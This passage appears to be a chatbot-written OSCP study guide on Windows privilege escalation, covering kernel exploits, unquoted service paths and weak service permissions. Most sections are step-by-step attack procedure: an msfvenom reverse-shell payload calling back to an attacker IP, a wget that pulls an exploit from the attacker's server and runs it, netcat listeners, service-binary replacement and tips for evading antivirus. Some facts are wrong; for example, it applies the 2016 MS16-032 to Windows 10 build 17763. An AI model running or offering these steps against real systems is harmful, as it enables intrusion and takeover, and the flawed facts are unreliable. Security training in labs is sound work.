✔ You have impersonation privileges → possible to abuse.
✔ Old OS build → kernel exploit possible.
✔ SYSTEM service running → hijack chance.
✔ Writable folder → plant files.
✔ Writable scheduled task → escalate.

---

## ➤ **Section 9 – Best Practices**

✔ Run enumeration slowly and carefully.
✔ Always document results.
✔ Compare outputs with known vulnerabilities.
✔ Don’t blindly exploit without understanding the system.
✔ Use tools like `winPEAS` but verify manually.
✔ Understand registry keys and what they control.
✔ Always check permissions and services.

---

## ➤ **Section 10 – Common Mistakes**

❌ Skipping enumeration → going straight to exploits.
❌ Ignoring disabled privileges → sometimes they can be abused.
❌ Running enumeration as admin → misleading results.
❌ Not checking both HKLM and HKCU registry entries.
❌ Forgetting to look at folder permissions → attackers often plant files there.

---

## ➤ **Section 11 – Exercises**

### ✅ **Exercise 1 – Learn `whoami /priv`**

* Run the command and write definitions for each privilege.
* Research how each can be exploited.

### ✅ **Exercise 2 – Map OS versions to exploits**

* Pick three builds from `systeminfo`.
* Compare with kernel exploit databases.

### ✅ **Exercise 3 – Explore services**

* List all services.
* Check which ones run as SYSTEM.
* Identify unquoted paths.

### ✅ **Exercise 4 – Registry deep dive**

* Query AlwaysInstallElevated.
* Explore other subkeys like `CurrentControlSet\Services`.

### ✅ **Exercise 5 – Permissions check**

* Explore `icacls`.
* Find writable directories → think how you could plant files.

### ✅ **Exercise 6 – Create enumeration notes**

* Use a spreadsheet or notebook to track commands → output → findings → possible attacks.

---

## ➤ **Section 12 – Summary**

✔ Enumeration is the first and most important step before privilege escalation.
✔ Knowing who you are, what privileges you have, and what is running helps you choose the right exploit.
✔ Manual enumeration commands give you deep understanding — never rely on automated tools alone.
✔ Registry keys, services, permissions, and patches are your roadmap to escalation.
✔ Writing and interpreting outputs will make you faster and more efficient in OSCP.
✔ Practicing enumeration repeatedly will prepare you to attack real machines confidently.

---


# 📘 **Chapter 4 – Common Privilege Escalation Techniques (Deep & Structured)**

---

## ✅ **What You Will Learn in This Chapter**

1. The main techniques used for privilege escalation on Windows systems.
2. How to find and exploit each technique safely and effectively.
3. Commands, tools, and scripts required to test and exploit vulnerabilities.
4. Real examples with step-by-step processes.
5. How to think like an attacker while being careful not to crash systems.

---

## ✅ **Section Breakdown**

* **4.1 Kernel Exploits (Version-Based Escalation)**
* **4.2 Unquoted Service Path**
* **4.3 Weak Service Permissions**
* **4.4 AlwaysInstallElevated (MSI Abuse)**
* **4.5 Credential Hunting**
* **4.6 DLL Hijacking**
* **4.7 Scheduled Tasks Exploitation**
* **4.8 Privileges Abuse**

Each section will include:
✔ Concept explanation
✔ Why it’s dangerous
✔ Commands to find it
✔ Exploitation steps
✔ Risks and best practices

---

### ✅ **4.1 Kernel Exploits (Windows Version-Based Escalation)**

#### ✅ **What is a Kernel Exploit?**

The Windows kernel is like the brain of the operating system — it controls how the OS interacts with hardware and manages resources. When there’s a bug or missing security update in the kernel, attackers can exploit it to escalate privileges to SYSTEM.

---

#### ✅ **Why It Matters**

* Kernel exploits can give you full control of the system.
* They often rely on outdated patches — once you know the build version, you can pick the right exploit.
* It’s powerful but risky — running a wrong exploit can crash or lock the system.

---

#### ✅ **How to Find Vulnerable Systems**

1. Run the following command to get the OS version:

   ```powershell
   systeminfo
   ```

   Look for:

   * OS Name (Windows 7, 8, 10, etc.)
   * OS Version / Build Number

2. Run this to list installed patches:

   ```powershell
   wmic qfe
   ```

   Identify missing patches or compare with exploit databases.

3. Use **Windows Exploit Suggester**:

   * Input OS build → find known kernel exploits.

---

#### ✅ **Common Exploits**

| Exploit            | Affected Versions              | Notes                                 |
| ------------------ | ------------------------------ | ------------------------------------- |
| MS16-032           | Windows 7/8                    | Well-known local privilege escalation |
| MS10-015           | Older builds                   | Can still be found in legacy systems  |
| CVE-based exploits | Check specific vulnerabilities | Use in labs, not always safe in exams |

---

#### ✅ **Steps to Use Kernel Exploits**

1. Find OS version → match exploit.
2. Download or compile the exploit for the correct architecture (x86/x64).
3. Upload it to the target machine.
4. Run it carefully → check for errors first.
5. If successful → you’ll get SYSTEM privileges.

---

#### ✅ **Risks**

✔ Can crash the system → always backup snapshots when practicing.
✔ Wrong exploit → locks you out.
✔ Anti-virus may block execution → disable it or use quiet modes.

---

#### ✅ **Example Scenario**

* You find Windows 10, build 17763.
* Missing patches → kernel exploit MS16-032 available.
* You compile the exploit and run it → escalate to SYSTEM.

---


Absolutely ✅ Now let’s go deep into **4.1 Kernel Exploits (Windows Version-Based Escalation)** — explained from basics to advanced, with every detail you need for practical understanding.

---

## 📘 **4.1 Kernel Exploits (Windows Version-Based Escalation)** – In Deep

---

### ✅ **What is the Kernel and Why It’s Important**

The **kernel** is the core of the Windows operating system. It manages:

✔ Hardware interactions (memory, disk, CPU)
✔ User accounts and permissions
✔ Process control
✔ Security mechanisms like authentication and file access

When there's a bug in the kernel or when a patch is missing, attackers can exploit this weakness to run code with **SYSTEM privileges**, the highest level possible in Windows.

---

### ✅ **How Kernel Exploits Work**

1. A vulnerability is discovered in the kernel code (like how memory is handled).
2. Microsoft releases a security patch to fix it.
3. If the system hasn’t installed that patch, attackers can craft malicious code to exploit the vulnerability.
4. By running the exploit, attackers can break the usual security layers and escalate privileges.

---

### ✅ **Why Kernel Exploits Are Powerful**

* SYSTEM access gives complete control over the system.
* You can extract credentials, hide tracks, or manipulate configurations.
* Kernel exploits bypass many security restrictions like User Account Control (UAC).

---

### ✅ **When You Should Use Kernel Exploits**

✔ When enumeration shows outdated OS build or missing patches
✔ When other privilege escalation methods (services, registry, etc.) fail
✔ As a last resort — because it’s risky
✔ When practicing in labs or controlled environments

---

### ✅ **Important Warnings**

❗ **Can crash the system** → always use a snapshot or backup before testing.
❗ **Not all exploits are safe on all builds** → always verify architecture (x86 or x64).
❗ **Antivirus may block exploits** → disable temporarily or run in test mode.

---

## ➤ **4.1.1 How to Find Vulnerable Systems – Step by Step**

### Step 1 – Check OS version and build number

Open a PowerShell or CMD prompt and run:

```powershell
systeminfo
```

You’ll get output like:

```
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.17763 Build 17763
System Type:               x64-based PC
...
```

✅ **Important details:**

* OS Version → tells you if it’s outdated.
* Build number → critical to matching exploits.
* Architecture → x64 vs x86 → required for proper exploit.

---

### Step 2 – Check installed patches

Run:

```powershell
wmic qfe
```

This lists installed security updates (KB articles), for example:

```
HotFixID  Description  InstalledOn
KB4480970  Security Update  10/12/2019
KB4470788  Update          09/01/2019
```

Compare these updates with known vulnerabilities to see which patches are missing.

---

### Step 3 – Use Windows Exploit Suggester

* Download the tool:
  [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

* Input the OS build number → it will tell you:

  * What vulnerabilities exist
  * CVE numbers
  * Exploit availability

Example output:

```
CVE-2016-0099  MS16-032  Windows Kernel Local Privilege Escalation
```

---

### ✅ Practice Exercise

1. Setup a Windows 7 or Windows 10 virtual machine.
2. Run `systeminfo` → note version.
3. Run `wmic qfe` → list missing patches.
4. Use Windows Exploit Suggester → find kernel exploits.

---

## ➤ **4.1.2 Common Kernel Exploits Explained**

### ✅ MS16-032 – Local Privilege Escalation

* Affects older versions of Windows.
* Exploits how the kernel handles certain memory requests.
* Gives SYSTEM privileges if the target OS isn’t patched.

**Steps:**

1. Find vulnerable version.
2. Download or compile exploit.
3. Upload to target machine.
4. Run → escalate privileges.

---

### ✅ MS10-015 – Legacy Kernel Exploit

* Targets older Windows XP or Server versions.
* Exploitable by modifying specific structures in memory.
* Less common but important in legacy systems.

---

### ✅ CVE-based Exploits

* Research vulnerabilities using:

  * [Exploit-DB](https://www.exploit-db.com/)
  * [CVE Details](https://www.cvedetails.com/)
  * Windows Exploit Suggester.

* Always confirm build and architecture before applying.

---

## ➤ **4.1.3 How to Compile and Run Kernel Exploits**

### ✅ Check architecture

Run:

```powershell
wmic os get osarchitecture
```

You’ll get:

```
64-bit
```

---

### ✅ Download exploit source code

Most exploits are available in C/C++ format. Example:

* MS16-032 code → download from trusted source like GitHub or exploit-db.

---

### ✅ Compile with appropriate compiler

If using GCC or Visual Studio:

```bash
gcc -o exploit.exe exploit.c
```

or open `.sln` files and build for x64/x86 target.

---

### ✅ Upload to target machine

You can use:

✔ File transfer via PowerShell
✔ SMB shares
✔ Python HTTP server
✔ Netcat file transfer

---

### ✅ Run carefully

```powershell
.\exploit.exe
```

Observe results — if the exploit is successful, you should see elevated privileges.

---

## ➤ **4.1.4 Verifying SYSTEM Privilege**

After running the exploit, check privileges:

```powershell
whoami
```

Expected output:

```
nt authority\system
```

You now have full control.

---

## ➤ **4.1.5 Risk Management**

✔ Always use snapshots before testing.
✔ Run exploits in a lab, not production environments.
✔ Confirm build version and architecture multiple times.
✔ Document each step — especially when performing in exams.

---

## ➤ **4.1.6 Real Example Walkthrough**

**Target System:**

* Windows 10 Pro
* Build 17763
* Architecture: x64
* Missing MS16-032 patch

**Steps:**

1. `systeminfo` → confirm version.
2. `wmic qfe` → see missing updates.
3. Use exploit suggester → find MS16-032 applicable.
4. Compile exploit → ensure x64 target.
5. Upload using Python server:

   ```bash
   python3 -m http.server 8000
   ```
6. On target:

   ```powershell
   wget http://<your-ip>:8000/exploit.exe -OutFile exploit.exe
   .\exploit.exe
   ```
7. Run `whoami` → SYSTEM privileges gained.

---

## ➤ **4.1.7 Summary**

✔ Kernel exploits target flaws in Windows’ core layer — the kernel.
✔ They work by exploiting missing patches or vulnerabilities in memory handling.
✔ You must check OS version, build, and installed patches carefully.
✔ Tools like `systeminfo`, `wmic qfe`, and Windows Exploit Suggester help identify vulnerabilities.
✔ Compiling and running exploits require correct architecture and safety precautions.
✔ Always backup or use snapshots — running a wrong exploit can crash the system.
✔ Once successful, you gain SYSTEM access — full control of the machine.

---

# 📘 **4.2 Unquoted Service Path – In Deep**

---

### ✅ **What is Unquoted Service Path?**

When Windows starts a service, it looks at the service’s executable path in the registry or service configuration.

If that path contains spaces (like in `"C:\Program Files\My Service\service.exe"`), but **the path is not enclosed in quotes**, Windows may misinterpret it and try to execute malicious files placed in the wrong locations.

This happens because Windows parses the path by splitting it at spaces and attempting to run executable files from the start.

---

### ✅ **Why It’s Dangerous**

✔ Attackers can hijack services running as SYSTEM.
✔ It’s one of the easiest privilege escalation methods when misconfigured.
✔ No need for complicated exploits — just place a malicious `.exe` in the right location.
✔ It’s a misconfiguration mistake, not a bug — administrators may overlook it.

---

### ✅ **How It Works – Example**

#### Legitimate service path:

```
C:\Program Files\My Service\service.exe
```

If unquoted, Windows interprets it as:

1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

So if you can place a malicious `C:\Program.exe`, Windows will run it with SYSTEM privileges.

---

### ✅ **Where This Happens**

* Services installed incorrectly.
* Paths with spaces but without quotes.
* Often found in legacy software or third-party apps.

---

## ➤ **4.2.1 How to Find Unquoted Service Paths**

### ✅ Method 1 – Using PowerShell/Command Line

Run this command to list services with auto-start configuration:

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
```

This lists:

* Service Name
* Display Name
* Path to executable
* Start mode

Look for entries where the `Pathname` has spaces and no quotes.

---

### ✅ Example Output

```
Spooler          Print Spooler       C:\Windows\System32\spoolsv.exe     Auto
MyService        Example Service     C:\Program Files\My Service\service.exe  Auto
```

Check if `C:\Program Files\My Service\service.exe` is unquoted → potential vulnerability.

---

### ✅ Method 2 – Using `sc qc <service_name>`

Get detailed service information:

```powershell
sc qc MyService
```

Output:

```
SERVICE_NAME: MyService
DISPLAY_NAME: Example Service
BINARY_PATH_NAME: C:\Program Files\My Service\service.exe
START_TYPE: Auto Start
```

If `BINARY_PATH_NAME` is unquoted → exploitable!

---

## ➤ **4.2.2 How to Exploit Unquoted Service Path**

### ✅ Precondition

* Service runs as SYSTEM.
* Executable path is unquoted.
* Attacker can write files to locations like `C:\` or `C:\Program Files\My`.

---

### ✅ Attack Steps

#### Step 1 – Identify vulnerable service

Use commands from the previous section.

#### Step 2 – Determine exploitable path segments

If the path is:

```
C:\Program Files\My Service\service.exe
```

It can be split into:

1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Service\service.exe`

Check if attacker can place a malicious `.exe` in `C:\` or `C:\Program Files\My`.

#### Step 3 – Create malicious executable

* Prepare a reverse shell executable or malicious payload.
* Example: Use msfvenom or create a simple reverse shell in C.

Example with msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o Program.exe
```

This creates `Program.exe` which will connect back when executed.

#### Step 4 – Place the executable

Copy the malicious executable to the location:

```powershell
copy .\Program.exe C:\
```

#### Step 5 – Restart the service

Use:

```powershell
sc stop MyService
sc start MyService
```

When Windows starts the service, it will execute your malicious file.

#### Step 6 – Catch the reverse shell

Start a listener on your attacker machine:

```bash
nc -lvnp 4444
```

Once the service starts, SYSTEM shell is opened!

---

## ➤ **4.2.3 Real-Life Example**

**Service Path:**
`C:\Program Files\Example App\app.exe` (unquoted)

**You find that:**
✔ It starts automatically
✔ Runs as SYSTEM
✔ You have write permissions to `C:\Program Files\Example`

You:

1. Create a reverse shell named `My.exe`
2. Place it in `C:\Program Files\Example\`
3. Restart the service
4. SYSTEM shell obtained!

---

## ➤ **4.2.4 Tools That Help Find Unquoted Paths**

* **wmic** – Lists services and paths.
* **sc** – Shows service config.
* **AccessChk** – Checks permissions on folders.
* **PowerUp** – Scans for common privilege escalation paths, including unquoted paths.

---

## ➤ **4.2.5 Common Locations for Exploitation**

| Path Segment                              | Example                                              |
| ----------------------------------------- | ---------------------------------------------------- |
| `C:\Program.exe`                          | Place malicious executable in root directory         |
| `C:\Program Files\My.exe`                 | Place in subfolder if writable                       |
| `C:\Program Files\My Service\service.exe` | Final target, often protected but sometimes writable |

Always check folder permissions with:

```powershell
icacls "C:\Program Files\My"
icacls "C:\Program Files\My Service"
```

If writable → exploitation possible.

---

## ➤ **4.2.6 How to Defend Against It**

✔ Always quote service paths with spaces
✔ Restrict folder permissions — only admins should have write access
✔ Regularly audit services and their configurations
✔ Use group policies to enforce secure service settings

---

## ➤ **4.2.7 Risks During Exploitation**

✔ If the folder is not writable → exploitation fails
✔ Incorrect architecture of payload → won't run
✔ Antivirus may block payload → use obfuscation or manual binaries
✔ Restarting services carelessly → crash or alert system admins

---

## ➤ **4.2.8 Practice Exercise**

1. Setup a vulnerable Windows service with unquoted path.
2. Run enumeration commands (`wmic`, `sc qc`).
3. Identify which paths are exploitable.
4. Write a malicious executable using msfvenom or a custom reverse shell.
5. Copy it to writable folder.
6. Restart the service and obtain a shell.
7. Document the steps, outputs, and how you confirmed exploitation.

---

## ➤ **4.2.9 Summary**

✔ Unquoted service paths happen when services with spaces in their path aren’t enclosed in quotes.
✔ Windows tries to parse the path incorrectly → attacker can hijack it by placing malicious executables.
✔ It’s exploitable only if:

* Service runs as SYSTEM
* Path is unquoted
* Folder is writable
  ✔ Enumeration using `wmic` and `sc` helps identify targets.
  ✔ Exploitation is simple but requires careful placement of files.
  ✔ Always audit services and fix paths with quotes and correct permissions.

---


# 📘 **4.3 Weak Service Permissions – In Deep**

---

### ✅ **What Are Weak Service Permissions?**

Windows services are programs that run in the background and perform tasks, often with elevated privileges like SYSTEM.

**Weak Service Permissions** occur when a normal user is allowed to modify or control the service in ways they shouldn’t be able to — like:

✔ Changing service configuration
✔ Replacing the executable file
✔ Modifying registry entries or startup parameters

If you find such permissions, you can hijack the service to run malicious code and escalate to SYSTEM.

---

### ✅ **Why It’s Dangerous**

✔ It’s one of the easiest privilege escalation paths if misconfigured.
✔ Services that run automatically with SYSTEM privileges can be hijacked.
✔ Attackers don’t need kernel exploits or complex techniques — only write access to the service.
✔ Often overlooked by system admins during audits.

---

## ➤ **4.3.1 How It Works**

1. The service runs with SYSTEM privileges.
2. The service permissions allow normal users to change settings like:

   * Path to the executable.
   * Service start type.
   * Service parameters.
3. The attacker modifies the service to run malicious code.
4. Restarting the service executes the attacker's payload with SYSTEM privileges.

---

## ➤ **4.3.2 Key Concepts**

| Parameter            | Meaning                                  | Exploitation Opportunity                     |
| -------------------- | ---------------------------------------- | -------------------------------------------- |
| SERVICE\_START\_NAME | The account under which the service runs | SYSTEM → prime target                        |
| BINARY\_PATH\_NAME   | Path to executable                       | If writable or changeable → replace it       |
| Permissions (ACL)    | Who can control/configure the service    | If write permissions exist → hijack possible |

---

## ➤ **4.3.3 How to Find Weak Service Permissions**

### ✅ Step 1 – List services

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto"
```

This gives you services that start automatically.

Look for services where you have permissions.

---

### ✅ Step 2 – Get service configuration

For each suspicious service, run:

```powershell
sc qc <service_name>
```

Example output:

```
SERVICE_NAME: MyService
DISPLAY_NAME: Example Service
BINARY_PATH_NAME: C:\Program Files\Example\service.exe
START_TYPE: Auto Start
SERVICE_START_NAME: LocalSystem
```

If the service runs as `LocalSystem`, it’s exploitable if permissions are weak.

---

### ✅ Step 3 – Check permissions using AccessChk

[AccessChk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) is a great tool to check permissions.

Download it and run:

```powershell
accesschk64.exe -uwcqv <username> <service_name>
```

Where:

* `-u` = check permissions
* `-w` = write permissions
* `-c` = config permissions
* `-q` = quiet output
* `-v` = verbose output

If output shows you can configure or write → exploitable!

---

## ➤ **4.3.4 Exploitation Steps**

### ✅ Step 1 – Identify writable service

You find that `MyService` has weak permissions and is writable by your user account.

### ✅ Step 2 – Replace the executable

You can copy a malicious executable to the service’s path.

Example:

```powershell
copy .\reverse_shell.exe "C:\Program Files\Example\service.exe"
```

### ✅ Step 3 – Restart the service

```powershell
sc stop MyService
sc start MyService
```

Upon restart, your malicious code will run as SYSTEM.

---

### ✅ Step 4 – Confirm escalation

Run:

```powershell
whoami
```

Expected output:

```
nt authority\system
```

You now have full control.

---

## ➤ **4.3.5 Tools to Help Exploit Weak Service Permissions**

✔ **AccessChk** – Enumerates service permissions
✔ **sc** – View and control service config
✔ **wmic** – Quick service listing
✔ **PowerUp.ps1** – Automates scanning for weak service permissions
✔ **winPEAS** – Automated enumeration including weak service permissions

---

## ➤ **4.3.6 Example Walkthrough**

**Target Service:**

* Runs as `LocalSystem`
* Auto Start
* Path = `C:\Program Files\Example\service.exe`
* Writable by user `bob`

**Steps:**

1. Run `sc qc ExampleService` → see path and privileges.
2. Download and run `AccessChk` → confirm write permissions.
3. Upload a malicious executable using Python HTTP server:

```bash
python3 -m http.server 8000
```

On target machine:

```powershell
wget http://<your-ip>:8000/reverse_shell.exe -OutFile "C:\Program Files\Example\service.exe"
```

4. Restart service:

```powershell
sc stop ExampleService
sc start ExampleService
```

5. Open Netcat listener:

```bash
nc -lvnp 4444
```

6. SYSTEM shell opened!

---

## ➤ **4.3.7 How to Create a Malicious Executable**

You can use `msfvenom` or write a simple reverse shell in C.

Example using `msfvenom`:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o reverse_shell.exe
```

✔ Use obfuscation options to bypass antivirus if needed.

---

## ➤ **4.3.8 Risks and Safety Tips**

✔ Modifying services carelessly can crash the system
✔ Antivirus may block your payload → test with clean setups
✔ Running exploits without understanding permissions → leads to lockout
✔ Always take snapshots before testing

---

## ➤ **4.3.9 Defending Against Weak Service Permissions**

✔ Audit services regularly using tools like `AccessChk`
✔ Lock down services with proper permissions → only admins should configure
✔ Avoid running services as SYSTEM unless necessary
✔ Apply group policies to enforce security standards

---

## ➤ **4.3.10 Practice Exercises**

1. Install a service on a Windows VM with default or weak permissions.
2. Enumerate services using `wmic` and `sc qc`.
3. Use `AccessChk` to find services where you have write access.
4. Replace the service binary with a reverse shell.
5. Restart the service and confirm SYSTEM access.
6. Document how permissions were configured and how you exploited them.

---

## ➤ **4.3.11 Summary**

✔ Weak service permissions allow attackers to hijack services running as SYSTEM.
✔ It’s a common misconfiguration where normal users are given unnecessary write or configuration permissions.
✔ Using `wmic`, `sc`, and `AccessChk`, you can identify vulnerable services.
✔ Exploitation involves replacing the executable and restarting the service.
✔ It’s a practical and often overlooked privilege escalation technique.
✔ Always audit and restrict permissions to secure your environment.

---



